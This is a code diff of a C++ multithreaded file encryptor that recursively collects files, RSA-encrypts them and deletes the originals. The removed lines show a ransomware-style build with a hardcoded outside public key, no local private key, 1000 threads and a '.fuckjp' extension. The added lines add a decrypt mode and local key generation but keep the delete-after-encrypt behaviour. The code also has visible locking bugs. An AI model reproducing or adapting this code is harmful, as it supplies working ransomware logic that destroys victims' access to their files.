@@ -20,34 +20,24 @@
 #include <stdlib.h>
 #include <dirent.h>
 #include <queue>
-
 #include "foreach.h"
 #include "foreach.cpp"
 
-pthread_mutex_t mutex_x = PTHREAD_MUTEX_INITIALIZER;
-
-sem_t sem;
-queue<string> wok_file_list;
+using namespace std;
 
 #define KEY_LENGTH 2048           // 密钥长度
 #define PUB_KEY_FILE "pubkey.pem" // 公钥路径
 #define PRI_KEY_FILE "prikey.pem" // 私钥路径
+#define thread_num 10
 
-using namespace std;
-
+pthread_mutex_t mutex_x = PTHREAD_MUTEX_INITIALIZER;
+queue<string> wok_file_list;
 int padding = RSA_PKCS1_PADDING;
-
-static string pub_key = R"(-----BEGIN PUBLIC KEY-----
-MIIBIDANBgkqhkiG9w0BAQEFAAOCAQ0AMIIBCAKCAQEAtycpDMtjsaDFD8spoHrK
-AVbyOnt1xxzrW+Dn8xZLY6N9wwFonZ1gg5Sd5CQMceEn4ZdXmR54js2aKU+0MWGn
-TB/98n/O22BCXpUVfhK3u1s8bq/R/h6uPtOiFw6xJPMUEGH08gY5mk5BUO79PTcN
-lN4jXNkqPieyPns5nHaPJsZy+DVryyQ2WIrJM2Rt6GRsQKOUwNY4vVJpn2ppKpHM
-qn3mpI9yg6GC6QlCZqt2xNXuFvtNWwHls0XanangSL0zTc6SCUYCPAhItewIZeZ7
-VaXcejjiOWYLYRPsQyJbFYm1C0VlFdfBlowoSObh6k4m7tUOs+yqTMe2dIkqMIZW
-6QIBAw==
------END PUBLIC KEY-----
-)";
-static string pri_key;
+string pub_key;
+string pri_key;
+string sufstr;
+typedef void *(*ThreadFunc)(void *);
+ThreadFunc tf = NULL;
 
 // 从文件读入到string里
 string readFileIntoString(const string filename)
@@ -58,7 +48,6 @@ string readFileIntoString(const string filename)
     char ch;
     while (buf && ifile.get(ch))
     {
-        // printf("4444444:%c\n", ch);s
         buf.put(ch);
     }
 
@@ -164,7 +153,6 @@ void GenerateRSAKey(string &out_pub_key, string &out_pri_key)
 **/
 string RsaPubEncrypt(const string &clear_text, const string &pub_key)
 {
-    // printf("start\t%s\t\n", clear_text.c_str());
     string encrypt_text;
     BIO *keybio = BIO_new_mem_buf((unsigned char *)pub_key.c_str(), -1);
     RSA *rsa = RSA_new();
@@ -196,11 +184,7 @@ string RsaPubEncrypt(const string &clear_text, const string &pub_key)
         ret = RSA_public_encrypt(sub_str.length(), (const unsigned char *)sub_str.c_str(), (unsigned char *)sub_text, rsa, RSA_PKCS1_PADDING);
         if (ret >= 0)
         {
-            // printf("%s\n", sub_text);
             encrypt_text.append(string(sub_text, ret));
-            // printf("append:\t%s\n\n\n", encrypt_text.c_str());
-            // printf("append end %d\n", encrypt_text.size());
-            // printf("enc append: %d\n", encrypt_text.size());
         }
         pos += block_len;
     }
@@ -211,10 +195,6 @@ string RsaPubEncrypt(const string &clear_text, const string &pub_key)
 
     delete[] sub_text;
 
-    // printf(" 222%s\n", encrypt_text.c_str());
-    // printf("fuckyou \n");
-    // printf("%d\n" , encrypt_text.size());
-    // printf("endfunc:\t%d\n", encrypt_text.size());
     return encrypt_text;
 }
 
@@ -269,86 +249,150 @@ string RsaPriDecrypt(const string &cipher_text, const string &pri_key)
     return decrypt_text;
 }
 
-bool isFileExists_ifstream(string & name) {
+bool isFileExists_ifstream(string &name)
+{
     ifstream f(name.c_str());
     return f.good();
 }
 
-void *encOne(void *arg)
+void *decOne(void *arg)
 {
-    try
+    string filename;
+    string noenc_filename;
+
+    while (1)
     {
-        // char *filename = (char *)arg;
-        string filename;
-        // char filename[1024];
         pthread_mutex_lock(&mutex_x);
-        // strcpy(filename, wok_file_list.front().c_str());
+        if (wok_file_list.empty())
+            break;
         filename = wok_file_list.front();
-        string  fuckjp_fname = filename + ".fuckjp";
         wok_file_list.pop();
         pthread_mutex_unlock(&mutex_x);
-        
-        if(isFileExists_ifstream(fuckjp_fname)){
-            return arg;
+
+        noenc_filename = filename.substr(0, filename.size() - 4);
+        if (isFileExists_ifstream(noenc_filename))
+        {
+            return NULL;
         }
 
-        // if(!endsWith(filename, ".h")) {
-        //     return arg;
-        // }
+        try
+        {
+            string src_text;
+            string decrypt_text;
 
-        string src_text;
-        string encrypt_text;
-        string decrypt_text;
-        
-        // GenerateRSAKey(pub_key, pri_key);
-        //     if (pub_key.size() == 0)
-        //     {
-        //         pub_key = R"(-----BEGIN PUBLIC KEY-----
-        // MIIBIDANBgkqhkiG9w0BAQEFAAOCAQ0AMIIBCAKCAQEA2+3Ub1RoiZKJqBbctzbS
-        // 2WfnMcgp/NyLakOPgWU58neWh2s8XT3weSWqgUZVEmnSM5Qz+6T4KFzbN6qBJerO
-        // v/PgF6sPFHBSR45r4XTWtH+3xoUlaebne6xKtX1LHEfEh6P+jJpnZd7e3KGhH6Cp
-        // keGLzH0I+ydIyrQ/YeWN+b6n+Xu52zVD2qrYqnHfh2kD4sUz0wG79pT0RliW7DTN
-        // 4DANUpqQy3Qg7pU7rQpEfoK/qYFW/giAzwZbpYZeD7NFVIOUFaIH23XUAOKicB14
-        // tzydGUsVWYTm2EvvbuvVU4QVMXgh+dKQfohq7IJwhRbPoVFsp9ScejcqgZUcOAkf
-        // qQIBAw==
-        // -----END PUBLIC KEY-----
-        // )";
-        //     }
-        //     if (pri_key.size() == 0)
-        //     {
-        //         pri_key = readFileIntoString(PRI_KEY_FILE);
-        //     }
-        src_text = readFileIntoString(filename);
-        remove(filename.c_str());
-        cout << "start:" << filename << endl;
-        encrypt_text = RsaPubEncrypt(src_text, pub_key);
-        cout << "end:" << filename << endl;
-        ofstream outfile;
-        string enc_filename = filename + ".fuckjp";
-        // char *enc_filename;
-        // enc_filename = strcat(filename, ".2111");
-        outfile.open(enc_filename);
-        outfile << encrypt_text;
-        outfile.close();
+            src_text = readFileIntoString(filename);
+            remove(filename.c_str());
+            decrypt_text = RsaPriDecrypt(src_text, pri_key);
+            ofstream outfile;
+            outfile.open(noenc_filename);
+            outfile << decrypt_text;
+            outfile.close();
+            cout << "succ dec: " << filename << endl;
+        }
+        catch (...)
+        {
+            cout << "fail dec: " << filename << endl;
+        }
     }
-    catch (...)
+
+    return NULL;
+}
+
+void *encOne(void *arg)
+{
+    string filename;
+    string enc_filename;
+
+    while (1)
     {
-        cout << "未知异常" << endl;
+
+        pthread_mutex_lock(&mutex_x);
+        if (wok_file_list.empty())
+            break;
+        cout << "313 size " << wok_file_list.size() << endl;
+        filename = wok_file_list.front();
+        cout << "315 filename " << filename << endl;
+        wok_file_list.pop();
+        cout << "317 size " << wok_file_list.size() << endl;
+        pthread_mutex_unlock(&mutex_x);
+
+        enc_filename = filename + ".enc";
+        if (isFileExists_ifstream(enc_filename))
+        {
+            return NULL;
+        }
+
+        try
+        {
+            string src_text;
+            string encrypt_text;
+
+            src_text = readFileIntoString(filename);
+            cout << "333: " << endl;
+            //           cout << src_text << endl;
+            remove(filename.c_str());
+            encrypt_text = RsaPubEncrypt(src_text, pub_key);
+            ofstream outfile;
+            string enc_filename = filename + ".enc";
+            outfile.open(enc_filename);
+            outfile << encrypt_text;
+            outfile.close();
+            cout << "succ: " << filename << endl;
+        }
+        catch (...)
+        {
+            cout << "fail: " << filename << endl;
+        }
+        cout << 346 << endl;
     }
-    return arg;
+
+    return NULL;
 }
 
 int main(int argc, char *argv[])
 {
-    // sem_init(&sem, 0, 2);
-    if(argc < 2) {
-        cout << "argc < 2" << endl;
+
+    if (argc < 3)
+    {
+        cout << "argc < 3" << endl;
         exit(0);
     }
-    char *path = argv[1];
-    getAbsoluteFilesBySuffix(path, wok_file_list);
-    cout << "filename list size:\t" << wok_file_list.size() << endl;
-    int thread_num = 1000;
+
+    if (strcmp(argv[1], "enc") == 0)
+    {
+        sufstr = ".txt";
+        tf = encOne;
+    }
+    else if (strcmp(argv[1], "dec") == 0)
+    {
+        sufstr = ".enc";
+        tf = decOne;
+    }
+    else
+    {
+        cout << "argv[1] err " << endl;
+        exit(1);
+    }
+
+    GenerateRSAKey(pub_key, pri_key);
+    if (pub_key.size() == 0 || pri_key.size() == 0)
+    {
+        cout << "key err" << endl;
+        exit(0);
+    }
+
+    /*
+    cout <<"pubkey: " << endl;
+    cout << pub_key << endl;
+    cout <<"prikey: " << endl;
+    cout << pri_key << endl;
+    // exit(0);
+*/
+
+    getAbsoluteFilesBySuffix(argv[2], wok_file_list, sufstr);
+    cout << "file list size:\t" << wok_file_list.size() << endl;
+    // exit(0);
+
     pthread_t thread_list[thread_num];
     int i, j, iRet;
     for (i = 0; i < thread_num; i++)
@@ -356,16 +400,13 @@ int main(int argc, char *argv[])
         iRet = pthread_create(
             &thread_list[i],
             NULL,
-            encOne,
+            tf,
             NULL);
 
         if (iRet)
         {
             perror("pthread create");
             return iRet;
-        }
-        else
-        {
         }
     }
 
@@ -374,8 +415,6 @@ int main(int argc, char *argv[])
         pthread_join(thread_list[j],
                      NULL);
     }
-
-    // sem_destroy(&sem);
 
     return 0;
 }
